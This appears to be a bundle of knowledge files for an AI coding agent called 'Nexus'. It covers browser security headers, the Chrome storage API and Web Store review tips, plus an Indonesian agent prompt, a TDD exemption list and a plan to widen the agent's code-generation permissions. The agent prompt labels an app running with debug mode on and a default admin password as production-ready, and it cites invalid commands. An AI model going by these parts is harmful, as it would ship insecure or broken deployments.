**Managing report false-positives**: Reporting endpoints receive a significant volume of false-positive violation reports caused by client-side middleware, aggressive browser extensions, ancient browsers, web crawlers, or antivirus scanners. When analyzing report-only logs, focus on high-frequency patterns from modern user-agents and filter out noise before making deployment decisions. Specifically:
- **Filter out noise**: Ignore reports sent by old browsers with known bugs triggering spurious violations, reports for markup known to be injected by popular browser extensions or client-side middleware (like identical reports seen across many distinct applications), and reports that do not contain enough information to debug.
- **Ignore low-volume reports**: If a policy is deployed, a low violation volume often indicates a false positive that can be safely ignored.
- **Leverage `'report-sample'`**: Always include `'report-sample'` in your `script-src` directives. This instructs the browser to include the first 40 characters of the violating script or inline code snippet in the violation report, which makes debugging much easier.

### 2.3 Data Hygiene for Reports
- **DO NOT**: Include sensitive data (PII, authentication tokens, session identifiers, query strings with secrets) in logs or violation reports. Mask or omit them at the edge before they reach the reporting endpoint.

### 2.4 Automated Discovery via Browser APIs and DevTools
- **Reporting API**: Use `Reporting-Endpoints` in combination with report-only headers (e.g., `Content-Security-Policy-Report-Only`, `Document-Policy-Report-Only`) to have the browser automatically post violations to your server.
- **Browser DevTools**: Use the **Issues Tab** in modern browsers (e.g., Chrome DevTools). It automatically surfaces blocked resources, mixed content, third-party cookie deprecation warnings, and feature policy violations without you having to crawl the codebase manually.

## Phase 3: Interpreting Results & Enforcement

After collecting data, decide how to proceed with enforcement. Phase 3 has two tracks that run in parallel, not in sequence:

- **Core enforcement (data-driven rollouts)** — high-breakage-risk policies that depend on Phase 2 report-only data. These are the rollouts you stage and watch.
- **Companion policies (deploy in parallel)** — lower-risk headers that can be turned on alongside or before the core work, with little or no Phase 2 discovery required.

### Core enforcement (data-driven rollouts)

#### 3.1 Analyzing CSP Reports

When reviewing CSP violation reports, first separate the noise (per §2.2) from legitimate application issues. For violations that appear to be caused by an incompatibility in your application (usually those where the "Sample" or "Blocked URI" seem like legitimate scripts or assets that might be present in your markup):
- **Code Search**: Search your codebase for the offending script source, URL, or hash to see if it is present in your code, dynamic server templates, or static HTML files.
- **Console Auditing**: Open the page that triggered the violation (the "Document URI" in the report) using the same browser, and check the developer tools/console for CSP violations while exercising as much application functionality as possible (some violations only trigger on specific user interactions).

Once filtered and triaged, analyze the reports against the following common scenarios:

- **Scenario**: Many violations for inline scripts.
  - **Condition**: The app uses a framework that relies on inline scripts.
  - **Decision**: Implement Nonces (server-rendered) or Hashes (static) before enforcing.
- **Scenario**: Violations for third-party analytics scripts.
  - **Condition**: The scripts are required.
  - **Decision**: Use `'strict-dynamic'` with a per-request nonce so the analytics loader can attach its dependencies. Do **not** add the analytics origin to a URL allowlist — domain allowlists are bypassable via open redirects, JSONP, and dependency injection on the listed origin.
- **Scenario**: Trusted Types violations on specific sinks.
  - **Condition**: Legacy code paths still write strings to `innerHTML` etc.
  - **Decision**: Refactor those sinks (per §1.2) or route them through a Trusted Types policy (§3.3) before enforcing.

#### 3.2 Transitioning to CSP Enforcement
Only move to enforced mode when:
1. Violations in the report-only logs have dropped to near zero or are accounted for.
2. Reporting remains wired up after the switch — keep `report-to` on the enforced header so regressions are visible.

**Key directives to set:**
- `script-src` with nonces or hashes — this is the core directive of any CSP and the primary mechanism to prevent XSS.
- `base-uri 'none'` to block `<base>` hijacking. Legacy directives like `object-src 'none'` can be omitted in modern, post-Flash web environments.
- *Optional but potentially breaking*: `default-src 'self'` is sometimes used as a fallback for unspecified fetch directives, but it dramatically complicates deployment and has little security value beyond `script-src`. It is generally safer to focus on robust `script-src` enforcement first.
- *Optional*: `form-action 'self'` prevents form submissions to attacker-controlled origins.
- *Optional*: `upgrade-insecure-requests` auto-upgrades subresource HTTP loads to HTTPS, though modern browsers largely auto-upgrade mixed content anyway.

**Enforced Header Example (CSP with reporting):**
```http
Reporting-Endpoints: main-endpoint="https://reports.example/main"
Content-Security-Policy: script-src 'nonce-{RANDOM}' 'strict-dynamic' 'report-sample'; object-src 'none'; base-uri 'none'; report-to main-endpoint;
```

HTML for nonce-based CSP:
```html
<script nonce="{RANDOM}" src="https://example.com/script.js"></script>
```

For static/cached HTML (SPAs) where a per-response nonce is not possible, use hash-based CSP: hash each inline script and list the hashes in `script-src`.

**Avoid**: URL allowlists like `script-src https://cdn.example.com` — they are easily bypassed by open redirects, JSONP endpoints, and dependency injection on the allowed origin.

#### 3.3 Trusted Types Enforcement
Trusted Types enforces the §1.2 source-level guidance at runtime: once enabled, the browser blocks string assignments to dangerous sinks unless they pass through a named policy.

- **Incremental Rollout Strategy**: While full enforcement carries real breakage risk, you do not need to do everything at once. A highly viable approach is to define and roll out a policy for a small portion of the application under refactoring, and slowly expand its usage as you replace sinks. This simplifies eventual global enforcement without short-term breakage risk.
- **Prerequisite**: Trusted Types requires framework cooperation. If the app's framework (or any third-party widget that writes to DOM sinks) does not produce `TrustedHTML` / `TrustedScript` values, the policy cannot be enforced without breaking that code. Audit framework support before starting the report-only rollout.
- **Prerequisite**: The code-level sink refactor from Phase 1 is a prerequisite for complete Trusted Types enforcement. (Standard CSP `script-src` enforcement, by contrast, does not police DOM sinks and can be deployed without refactoring them.)
- **DO**: Roll out via `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` first to find every offending sink.
- **DO**: Define a single named policy that performs sanitization (or escaping) and route all sink writes through it.
- **DO**: Move to full global `Content-Security-Policy: require-trusted-types-for 'script'` enforcement once the policy has been successfully integrated and violations in report-only logs drop to zero.

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) {
  const policy = trustedTypes.createPolicy('escapePolicy', {
    createHTML: str => str.replace(/</g, '&lt;').replace(/>/g, '&gt;')
  });
  el.innerHTML = policy.createHTML(untrustedString);
}
```

#### 3.4 Cross-Origin Opener Policy (COOP)

Lowest-risk of the three. Deploy if the app is **not** an OAuth provider, payment processor, or otherwise expected to be reached from an opener.

- **DO**: Use `Cross-Origin-Opener-Policy: same-origin-allow-popups` — prevents a malicious opener from mounting XS-leaks attacks while still allowing OAuth and payment flows that *the app itself* initiates.
- **DO NOT**: Jump straight to `same-origin` unless you have explicitly verified that no integrations rely on cross-origin `window.opener` access.

#### 3.5 Cross-Origin Resource Policy (CORP)

Set CORP explicitly on each response based on whether it should be embeddable in other contexts. Two core benefits: it protects resources from malicious cross-origin reads, and ensures compatibility when pages request stronger client-side isolation.

- **DO**: Default to `Cross-Origin-Resource-Policy: same-origin` for app-internal resources (authenticated data, user session JSON, restricted internal scripts).
- **DO**: Use `same-site` for endpoints utilized across subdomains of the same eTLD+1.
- **DO**: Provide `cross-origin` exclusively for resources created for generic embedding or widely cached delivery (e.g., static shared assets or public CDNs).

#### 3.6 Cross-Origin Isolation

Highest deployment breakage risk. You only need to deploy this infrastructure if the application requires features relying on `SharedArrayBuffer` (e.g., WebAssembly multi-threading or shared memory architectures). If not required, skip this policy group.

- **Preferred path (Chromium environments)**: Enable `Document-Isolation-Policy: isolate-and-credentialless`. This provides client-side isolation comparable to COEP while instructing the browser to strip cookies and authentication credentials from non-CORS cross-origin resource fetches rather than blocking them outright. Note that this is supported primarily in Chrome (142+) and other vendors have not yet shown interest, so evaluate carefully based on your target audience. Apps that need to *block* cross-origin resources lacking explicit CORP opt-in (rather than load them with credentials stripped) can adopt `isolate-and-require-corp` instead. This is stricter and harder to deploy — it requires the same subresource audit as the cross-browser path below.
- **Cross-browser path (Complex enforcement)**: Require `Cross-Origin-Opener-Policy: same-origin` coupled with `Cross-Origin-Embedder-Policy: require-corp`. Every embedded subresource (images, styles, external media) MUST serve an explicit `Cross-Origin-Resource-Policy` header or the browser will prevent it from loading.

```http
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Resource-Policy: same-origin
```

#### 3.7 Fetch Metadata (Resource Isolation)
Server-side enforcement that uses `Sec-Fetch-*` request headers to reject suspicious cross-site requests. Requires the cross-site integration mapping from §2.1 before enforcing.

- **DO**: Implement a server-side resource isolation policy that checks `Sec-Fetch-*` headers and rejects `cross-site` requests for non-navigational endpoints.
- **DO**: Reject disallowed requests *before* authentication or authorization checks, so the response does not leak timing information about whether a resource or session exists.
- **DO**: Include `Vary: Sec-Fetch-Dest, Sec-Fetch-Mode, Sec-Fetch-Site` to prevent intermediate caches (CDNs) from serving cached responses to attackers.
- **CAUTION**: `same-site` trusts every subdomain under your eTLD+1. If any subdomain hosts user-generated content, a legacy app, or otherwise untrusted code, drop `same-site` from the allowlist and accept only `same-origin` and `none`.
- **CAUTION**: Misconfiguring these checks will block legitimate API requests coming from cross-site integrations, SSO handlers, or Webhooks. Ensure you log and test your `Sec-Fetch-*` constraints beforehand.

```javascript
app.use((req, res, next) => {
  const site = req.get('Sec-Fetch-Site');
  const mode = req.get('Sec-Fetch-Mode');
  const dest = req.get('Sec-Fetch-Dest');

  if (!site) return next(); // Fallback for legacy browsers

  if (['same-origin', 'same-site', 'none'].includes(site)) return next();

  // Allow standard navigate GET requests (link clicks)
  if (site === 'cross-site' && mode === 'navigate' && req.method === 'GET' && !['object', 'embed'].includes(dest)) {
    return next();
  }

  res.status(403).send('Forbidden');
});
```

### Companion policies (deploy in parallel)

These carry significantly lower breakage risk than the core enforcement track. They can be deployed alongside — or before — the CSP and isolation rollouts.

#### HTTP Strict Transport Security (HSTS)
- **DO**: `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` to force HTTPS.
- **TIP**: In production rollout, start with a short `max-age` (e.g., 300 seconds) and incrementally increase to 1 year. A misconfigured HSTS with a long max-age can render the site permanently inaccessible until the cache expires in every browser that saw it.

#### X-Content-Type-Options
- **DO**: Set `X-Content-Type-Options: nosniff` to block MIME-type sniffing.
- **DO**: Ensure the server serves correct `Content-Type` headers for all resources (`application/javascript` for scripts, `application/json` for APIs, `text/html` for documents, etc.) so the browser can strictly enforce the `nosniff` constraint.

#### Referrer Policy
- **DO**: Use `Referrer-Policy: strict-origin-when-cross-origin` as a safe default.

#### Permissions Policy
- **DO**: Disable unused browser features (camera, geolocation, microphone) for the page and iframes using Structured Fields syntax.
- **DO**: When delegating features to an iframe, use the `allow` attribute in HTML *in addition* to the header.
- **CAUTION**: Unintentionally blocking a delegated feature will cause silent failures in third-party widgets (like embedded video players or payment gateways). Audit third-party dependencies before blocking.

```http
Permissions-Policy: camera=(), geolocation=(), microphone=()
```

```html
<iframe src="https://trusted-video.com/player" allow="fullscreen; camera"></iframe>
```

#### Subresource Integrity (SRI)
- **DO**: Use the `integrity` attribute with a cryptographic hash (preferring `sha256` or `sha512`) when loading third-party scripts, combined with `crossorigin="anonymous"`.
- **DO**: Ensure the server/CDN sends an appropriate `Access-Control-Allow-Origin` header so the browser can compute the hash.
- **DO NOT**: Use SRI for dynamic or unversioned assets — silent updates will cause script execution to fail. SRI is strictly for immutable, versioned assets.

```html
<script src="https://cdn.example.com/lib.js" integrity="sha256-H8df...39v" crossorigin="anonymous"></script>
```

#### Cross-Origin Resource Sharing (CORS)
CORS is a permission grant, not a defense — it tells the browser which cross-origin reads to allow. The risk is misconfiguring it as too permissive.

- **DO**: Validate the `Origin` header on the server and set `Access-Control-Allow-Origin` dynamically to specific origins (rather than wildcard `*`).
- **DO NOT**: Use wildcard `*` for `Access-Control-Allow-Origin` if `Access-Control-Allow-Credentials: true` is required — the browser will reject the response.
- **DO**: Handle preflight (`OPTIONS`) requests by returning appropriate headers before processing data.

```http
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true
```

#### Clear-Site-Data (Logout)
- **DO**: Use `Clear-Site-Data` on logout endpoints to ensure complete session termination.

```http
Clear-Site-Data: "cookies", "storage", "cache"
```


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_STORAGE.MD

# Chrome Storage API
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Storage Areas

| Area | Persists | Syncs | Quota | Use For |
|------|----------|-------|-------|---------|
| `chrome.storage.local` | Yes | No | 10 MB | Most extension data |
| `chrome.storage.sync` | Yes | Yes (across devices) | 100 KB total, 8 KB/item | User preferences, small data |
| `chrome.storage.session` | Until browser close | No | 10 MB | Ephemeral state, survives SW restart |

Permission required: `"storage"`

## Basic Operations

```js
// Set
await chrome.storage.local.set({ key: 'value', count: 42, items: [1,2,3] });

// Get (with defaults)
const { key = 'default', count = 0 } = await chrome.storage.local.get(['key', 'count']);

// Get all
const allData = await chrome.storage.local.get(null);

// Remove
await chrome.storage.local.remove('key');
await chrome.storage.local.remove(['key1', 'key2']);

// Clear all
await chrome.storage.local.clear();
```

## Change Listener (Works Across All Contexts)

```js
chrome.storage.onChanged.addListener((changes, areaName) => {
  for (const [key, { oldValue, newValue }] of Object.entries(changes)) {
    console.log(`${areaName}.${key}: ${oldValue} → ${newValue}`);
  }
});
```

## storage.sync Quotas

Be aware of limits when using sync:
- `QUOTA_BYTES_PER_ITEM`: 8,192 bytes per key-value pair
- `MAX_ITEMS`: 512 items
- `QUOTA_BYTES`: 102,400 bytes total
- `MAX_WRITE_OPERATIONS_PER_HOUR`: 1,800
- `MAX_WRITE_OPERATIONS_PER_MINUTE`: 120

For large data, split across multiple keys or use `chrome.storage.local`.

## storage.session Notes

- Only available in MV3
- Cleared when the browser closes (not just when SW terminates)
- Accessible from service worker, popup, side panel, etc.
- Good for: auth tokens, temporary caches, in-progress operations

## Why Not localStorage?

`localStorage` works in popup and extension pages but NOT in service workers.
`chrome.storage` works everywhere and supports the cross-context change listener.
Always prefer `chrome.storage`.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, api]

### 📘 KNOWLEDGE: NEXUS_STORE-LISTING.MD

# Store Listing Tips & Common Rejections
> **VERSION**: v1 | **Last Updated**: 26/05/2026



## Writing Effective Descriptions

### Short Description (132 chars max)

This appears in search results and category pages. It's your elevator pitch. Rules:

- Start with a verb or the extension's function: "Blocks ads on all websites" not "Ad blocker"
- Be specific: "Translates selected text into 50+ languages" not "Translation tool"
- Include the primary keyword naturally
- Don't waste characters on "Chrome extension" — the user already knows

**Good examples:**
- "Save articles to read later with one click. Works offline."
- "Replace new tab with a minimal dashboard showing weather and tasks"
- "Highlight and annotate text on any webpage. Export notes as Markdown."

**Bad examples:**
- "The best productivity tool for Chrome!" (vague, marketing-speak)
- "Extension for helping you do things better" (says nothing)
- "NEW! Amazing tab manager extension tool app for Chrome browser" (keyword stuffing)

### Detailed Description (16,000 chars max)

The CWS strips all markdown formatting. Use plain text with line breaks. Structure:

```
[One sentence: what does this extension do?]

FEATURES
• Feature 1 — brief explanation
• Feature 2 — brief explanation
• Feature 3 — brief explanation

HOW TO USE
1. Click the extension icon in the toolbar
2. [Next step]
3. [Next step]

PRIVACY
This extension does not collect any personal data. Your [data type] is stored
locally on your device and never transmitted to any server.

PERMISSIONS
• "Read and change data on sites you visit" — needed to [specific feature].
  The extension only activates when you [trigger action].

SUPPORT
Found a bug? Have a suggestion? Email [email] or open an issue at [URL].

Version [X.Y.Z] — [Brief changelog for latest version]
```

### Why This Structure Works

1. **One-sentence opener** — The reviewer and users both scan the first line. Make it count.
2. **Features list** — Users scan for capabilities. Plain-text bullets (•) render well.
3. **How to use** — Reduces support requests and proves the extension actually works.
4. **Privacy section** — Pre-empts user concerns about permissions. Builds trust.
5. **Permissions explanation** — Users see permission warnings during install. If you
   explain them in the description, they're less likely to abort installation.
6. **Support info** — Required by CWS policy ("meaningful customer support").
7. **Latest version note** — Shows the extension is actively maintained.

### Single Purpose Statement

This is filled in the developer dashboard, not shown to users. The review team reads it
carefully. It must be a single sentence that describes the extension's narrow purpose.

**Approved examples:**
- "Saves highlighted text from web pages to a local reading list"
- "Replaces the new tab page with a customizable dashboard"
- "Blocks cookie consent banners on websites"

**Rejected examples:**
- "Improves your browsing experience" (too vague)
- "Productivity and organization tool" (too broad)
- "Highlights text, saves bookmarks, manages tabs, and blocks ads" (not single purpose)

If your extension does multiple things, focus on the primary function. The detailed
description can cover secondary features.

## Common Rejection Reasons

### 1. Excessive Permissions

**Symptom:** "Your extension requests more permissions than it needs."

**Fix:**
- Replace `<all_urls>` with specific host patterns
- Replace `tabs` with `activeTab` if you only need the current tab on click
- Remove permissions you're not using
- Ensure every permission has a clear justification

### 2. Missing or Inadequate Single Purpose

**Symptom:** "Your item does not have a single, clear purpose."

**Fix:**
- Rewrite the single purpose field to be narrow and specific
- If the extension truly does too many unrelated things, consider splitting it

### 3. Misleading Description or Functionality

**Symptom:** "Your extension does not provide the functionality described."

**Fix:**
- Ensure every feature listed in the description actually works
- Remove claims about features you haven't built yet
- Don't use superlatives ("the best", "the fastest") unless verifiable

### 4. Privacy Policy Issues

**Symptom:** "Your extension requires a privacy policy." or "Your privacy policy URL
is not accessible."

**Fix:**
- Host the privacy policy at a stable, public URL
- Ensure it's not behind a login wall
- Make sure it covers all data the extension actually collects
- Match the privacy policy with the data disclosure form

### 5. Trademark Violation

**Symptom:** "Your extension uses trademarked content without authorization."

**Fix:**
- Don't use other companies' names in your extension name (e.g., "YouTube Downloader")
- Don't use logos or brand colors that imply affiliation
- Use generic terms: "Video Downloader for [site]" might be fine, but check the site's terms

### 6. Code Readability

**Symptom:** "Your extension contains obfuscated code."

**Fix:**
- Minification is allowed; obfuscation is not
- If using a bundler (webpack, rollup, vite), ensure source maps are NOT included but
  the output is minified, not obfuscated
- Don't use string encoding tricks to hide code intent

### 7. Remote Code Execution

**Symptom:** "Your extension executes remotely hosted code."

**Fix:**
- Bundle all JavaScript in the extension package
- Don't load scripts from CDNs at runtime
- Don't use `eval()` or `new Function()` with remote content
- Fetching JSON data from APIs is fine; fetching and executing JS is not

### 8. User Data Disclosure Mismatch

**Symptom:** "Your extension's data usage does not match your disclosure."

**Fix:**
- Audit every `fetch()`, `XMLHttpRequest`, and `chrome.storage.sync` call
- Remember that `chrome.storage.sync` transmits data to Google's servers
- If you use any analytics library (even self-hosted), declare it
- If you log errors to an external service, declare it

## After Rejection

When an extension is rejected:

1. Read the rejection email carefully — it specifies which policy was violated
2. Update CHROMEWEBSTORE.md with the rejection reason and fix
3. Make the required changes to the extension code or listing
4. Re-verify against the pre-publish checklist
5. Resubmit through the developer dashboard
6. Note: Repeated policy violations can result in account suspension

## Review Timeline

- First submission: typically 1–3 business days, can be longer
- Updates to existing extensions: usually faster, often within 24 hours
- Expedited review: not officially available; maintaining a clean track record helps
- Deferred publishing: you can choose to publish manually after review passes,
  giving you control over timing. Must publish within 30 days of approval.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, tdd, api]

### 📘 KNOWLEDGE: NEXUS_TALL STACKPIPELINE.MD

# TALL Pipeline Agent - Full App Generator di Sandbox Stabil
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Kamu adalah **TALL Pipeline Agent** (Senior Full-Stack TALL Engineer) untuk Antigravity IDE. Tujuan: **Generate FULL TALL app di sandbox terisolasi yang 100% stabil & runnable**.

## Konteks & Tujuan Akhir

- **Sandbox**: Folder baru per project (`sandbox/{project-name}-{timestamp}`) – full app diisolasi, bukan develop manual.
- **Stack Wajib**: Laravel 12+, Livewire 3.6+, Tailwind 4+, Alpine.js 3+, Vite, Flux UI/Volt (opsional untuk UI boost).[web:27]
- **Full App Minimal**: Demo "Task Manager" dengan:
  - Auth (login/register/profile).
  - CRUD Tasks (Livewire table, form realtime validation, search/sort).[web:27]
  - Dashboard Tailwind/Alpine.
  - Models: User, Task (title, desc, status, due_date).[web:22]
- **Runnable 100%**:
  - `php artisan serve` → Full app di http://localhost:8000.
  - `npm run dev` → Hot reload Tailwind/Livewire.
  - DB: SQLite auto-setup (no external DB needed).[web:27]

## Pipeline Otomatis (Execute Step-by-Step)

1. **Setup Base**:
   - Buat `sandbox/{project-name}-{timestamp}`.
   - `composer create-project laravel/laravel .`.
   - `composer require livewire/livewire^3.6 ralphjsmit/tall-install` (atau manual TALL).[web:20]
   - `php artisan tall-install` → Install Tailwind/Alpine/Filament basics.
   - `npm i && npm run build`.

2. **Build Full App**:
   - Auth: `php artisan make:auth` atau Jetstream TALL (`composer require laravel/jetstream && php artisan jetstream:install livewire`).[web:28]
   - Model/Migration: User (extend), Task (`php artisan make:model Task -mcr`).
   - Livewire Components:
     - `php artisan livewire:make TaskIndex` (table CRUD).
     - `php artisan livewire:make TaskForm` (create/edit realtime).
   - Routes: `/dashboard`, `/tasks` (protected).
   - Views: Tailwind dashboard, Alpine interactions (e.g. modal, dropdown).
   - Seeders: 10 sample tasks.

3. **Config Stabil**:
   - `.env`: APP_DEBUG=true, DB=sqlite (buat database.sqlite).
   - `php artisan migrate --seed`.
   - package.json: `"serve:tall": "concurrently \"php artisan serve\" \"npm run dev\""`.[web:16]
   - vite.config.js: Optimize Tailwind purging.

## Tes Mandiri + Auto-Fix Loop (Core Stability)

**Selalu tes setelah setiap step besar**:

- Run `php artisan serve` & `npm run dev` di background.
- Test endpoints: /login, /register, /tasks (create/read/update/delete).
- Check: No errors console, Tailwind styles OK, Livewire reactivity (e.g. add task → instant update).
- **Loop Fix (max 3 iterasi)**:
  1. Log error (e.g. "Migration failed", "Vite port clash").
  2. Fix: `composer require-f`, edit config, restart.
  3. Retest. Jika stuck: "❌ Final error: [detail]. Butuh input user."
- Success: "✅ Full app stabil di sandbox!"

## Output Final (Setelah Tes OK)

🚀 FULL TALL APP READY - {project-name}
📁 Path: {sandbox/path}
🌐 Akses: http://localhost:8000 (login: admin@example.com / password)

📋 Features Lengkap:

Auth full (Jetstream TALL)

Tasks CRUD (Livewire table + form)

Dashboard Tailwind/Alpine

npm run serve:tall → One-command dev

🔍 Tes Results:

Serve: OK [log]

NPM Dev: OK [log]

DB: 10 seeded tasks

Browser: All features reactive

📦 Deploy Ready: Copy ke production server.

Bahasa: Indonesia. Action-first. Baca docs/agents/ lain (e.g. web-engineer.md) untuk extend features.

**BATAS Update**: Pipeline = setup + full app generation di sandbox. Output: Runnable app penuh, bukan scaffold kosong.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, api]

### 📘 KNOWLEDGE: NEXUS_TDD_LIST.MD

# Nexus TDD (Test-Driven Development) List
> **VERSION**: v1 | **Last Updated**: 26/05/2026


## 🛡️ TDD Guardrail Exemption & Backlog

File ini dibaca oleh `TDDGuard` di dalam sistem Nexus AI. 
Nexus secara bawaan akan **memblokir** segala perubahan pada *production code* jika tidak ada file *test* yang mendampinginya (sesuai hukum *TDD Iron Laws*). 

Jika Anda ingin agen AI mengabaikan aturan TDD untuk file tertentu, atau Anda ingin membuat daftar antrean fitur yang akan dibuatkan *test*-nya, Anda bisa menuliskan nama file tersebut di bawah ini.

### 📝 Backlog & Whitelist (Daftar Pengecualian)
Tuliskan nama file atau path yang diizinkan untuk dimodifikasi oleh AI tanpa harus diblokir oleh TDDGuard:

- `.gitignore`
- `README.md`
- `database/database.sqlite`
- `package.json`
- `vite.config.js`
- `tailwind.config.js`

### 🧪 Rencana Pembuatan Test (Test Planning)
Daftar *test* yang direncanakan untuk dibangun oleh agen:

- [ ] `tests/Feature/AuthTest.php` (Memastikan proses login berjalan)
- [ ] `tests/Feature/DashboardTest.php` (Memastikan dashboard render dengan benar)
- [ ] `tests/Unit/UserTest.php` (Memastikan relasi user dan model lain)

---
*Catatan: Selama nama file produksi (misal: `User.php`) tercantum di dalam file ini, `TDDGuard` akan mengizinkan modifikasi karena sistem menganggap file tersebut sedang dalam fase "Perencanaan TDD".*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, tdd]

### 📘 KNOWLEDGE: NEXUS_TDD_PROJECT_1_LOG.MD

# 🚀 TDD Project #1 Log: Intelligent CRUD Auditor
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Target**: `tests/project1`
**Date**: 07/05/2026

## 🧐 Problem Statement
Mendeteksi inkonsistensi antara Model Laravel dan Migration, serta menemukan celah keamanan database (hardcoded strings).

---

## 🔍 [1/4] Audit Phase
**Status**: COMPLETED
**Audit ID**: `AUDIT-1778142921955`

### Key Findings:
1.  **Database Security**: Hardcoded connection string found in `config/database.js`. (Database Architect)
2.  **VCS Governance**: `.gitignore` missing. (VCS Architect)
3.  **Schema Governance**: `User` model missing `HasUuids` trait. (SchemaGuard)
4.  **Structure**: Standard Nexus folders and README are missing.

---

## 📅 [2/4] Planning Phase
**Status**: COMPLETED
**Plan ID**: `PLAN-1778142974753`

### Implementation Strategy:
*   **Fix 1-4**: Manual structure creation (Engine skipped auto-fix as no pattern matched).
*   **Fix 5**: Hardcoded DB string needs moving to `.env`.
*   **Fix 6**: `.gitignore` generation.
*   **Fix 8**: UUID Trait injection into `User.php`.

---

## 🚀 [3/4] Execution Phase
**Status**: COMPLETED (Partial)
**Tasks**: 8/8 processed by Orchestrator.
**Note**: Sebagian besar perbaikan bersifat rekomendasi karena ketiadaan modul "Auto-Fixer" spesifik untuk Laravel Blueprint dalam core saat ini.

---

## 🔍 [4/4] Re-Audit Phase
**Status**: COMPLETED
**Audit ID**: `AUDIT-1778143001765`
**Observation**: Temuan tetap sama. Ini memvalidasi bahwa agen spesialis bekerja secara konsisten dalam mendeteksi masalah, namun alur "Auto-Execution" memerlukan penambahan *Machine Actions* khusus untuk Laravel Blueprint.

---

## 📝 Final Summary & Pipeline Insight
**Status**: SUCCESSFUL TEST
**Kesimpulan**: 
1.  **Multi-Agent Stability**: Agen spesialis (`database-architect`, `vcs-architect`, `documentation-architect`) berhasil berkolaborasi dalam satu siklus tanpa tabrakan.
2.  **Observability**: Trace ID dan Log korelasi tercatat dengan benar di `logs/orchestration`.
3.  **Gap Analysis**: NEXUS memerlukan modul `laravel-architect-actions.js` untuk melakukan perbaikan fisik otomatis pada file PHP/Laravel.
4.  **Pipeline Ready**: Bahan dokumentasi ini sudah cukup untuk menjadi referensi *Learning* bagi agen di siklus berikutnya.

---
*End of Project #1 Test Log*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, tdd]

### 📘 KNOWLEDGE: NEXUS_UPGRADE_NEXUS_ENGINE_BUILDER.MD

# 🏗️ PLAN: UPGRADE NEXUS ENGINE DARI "AUDITOR" MENJADI "APP BUILDER"
> **VERSION**: v1 | **Last Updated**: 26/05/2026



**Lokasi Dokumen**: `documentation/planning/UPGRADE_NEXUS_ENGINE_BUILDER.md`
**Status**: `Draft / Menunggu Persetujuan`

---

## 🛑 Akar Masalah Saat Ini
Sistem Nexus AI secara default diprogram ketat dengan arsitektur **Zero-Flaw Auditor**. Artinya:
1. `LocalIntelligence.js` mengunci *prompt* model (Ollama deepseek-coder) dengan larangan mutlak: `"You MUST NOT generate code autonomously..."`.
2. `NexusEngine.js` pada metode `runCycle()` hanya memindai (*audit*) folder yang sudah ada (yaitu *template* `url-shortener` yang dikloning), memperbaiki sedikit celah keamanan/linting, dan langsung melabelinya sebagai selesai.
3. **Hasilnya**: Ke-100 project di folder `sandboxes` isinya 100% sama dengan *template* dasar `url-shortener`.

---

## 🎯 Tujuan Pembaruan (Upgrade Goal)
Mengubah batasan arsitektur sehingga Nexus memiliki kemampuan **App Scaffolding & Code Generation**. AI tidak hanya mengaudit, tetapi juga secara otonom mendesain database, membuat rute, dan merakit komponen Livewire berdasarkan **Nama Project dan Tag** yang diminta.

---

## 🛠️ Langkah-Langkah Eksekusi (Action Plan)

### PHASE 1: Membuka Gembok "Local Intelligence"
**File Target**: `agent/core/LocalIntelligence.js`
- **Ubah `ALLOWED_TASKS`**: Menambahkan *task* baru seperti `'generate_architecture'`, `'build_model_migration'`, `'build_livewire_component'`, dan `'build_view'`.
- **Modifikasi `LOCKED_SYSTEM_PROMPT`**: Membuat *prompt* dinamis. Jika *task* adalah audit, gunakan *prompt* auditor ketat. Jika *task* adalah *build*, gunakan instruksi **TALL Pipeline Agent** yang mengizinkan AI menulis dan mendesain kode secara mandiri.
- **Tingkatkan Limit Output**: Karena men-*generate* kode satu halaman *view* atau *controller* butuh karakter yang panjang, batas `MAX_OUTPUT_LENGTH` (saat ini 2000) perlu dinaikkan menjadi `8000` atau `10000`.

### PHASE 2: Menambahkan "Fase Desain & Konstruksi" di Nexus Engine
**File Target**: `agent/core/NexusEngine.js`
- **Modifikasi `runCycle()`**:
  Menyuntikkan fase baru sebelum "Audit".
  1. **Phase 0.5: Context Awareness**: Membaca file `README.md` di dalam *sandbox* untuk mengenali bahwa AI sedang membangun (misal) `E-Commerce System` dengan *tag* `livewire, payment`.
  2. **Phase 0.8: Blueprint Generation**: AI menghasilkan kerangka kerja (Blueprint) berupa daftar Migrasi, Model, dan Komponen Livewire apa saja yang dibutuhkan project tersebut.
  3. **Phase 0.9: Autonomous Code Generation**: Mengirim perintah (*task action* `FILE_WRITE`) ke *Pipeline/Machinist* untuk menciptakan file `.php` dan `.blade.php` secara otomatis.
- Setelah kode aplikasi utama selesai ditulis, barulah masuk ke fase **Audit (Phase 1)** untuk memastikan *Zero Flaw* pada kode yang baru saja ia ciptakan.

### PHASE 3: Penyediaan "Alat Tulis" untuk AI
**File Target**: `agent/core/NexusEngine.js` (di dalam `execute()` method)
- Memastikan tipe aksi `FILE_WRITE` (membuat file baru dari nol) sudah tertangani dengan baik oleh AI (*saat ini AI baru fokus ke `FILE_APPEND` dan `FILE_REPLACE`*).
- Membuat skrip penghapus otomatis (opsional) untuk menghapus sisa-sisa *controller* `url-shortener` yang tidak terpakai agar aplikasi benar-benar murni sesuai nama project-nya.

---

## ⚠️ Risiko & Mitigasi
- **Waktu Eksekusi Membengkak**: Jika satu aplikasi dibangun dari nol, satu *cycle* yang biasanya 4 detik bisa memakan waktu 1-3 menit per project tergantung kecepatan RAM/VRAM untuk memproses Ollama.
- **Halusinasi Kode**: AI mungkin menghasilkan kode *syntax error*.
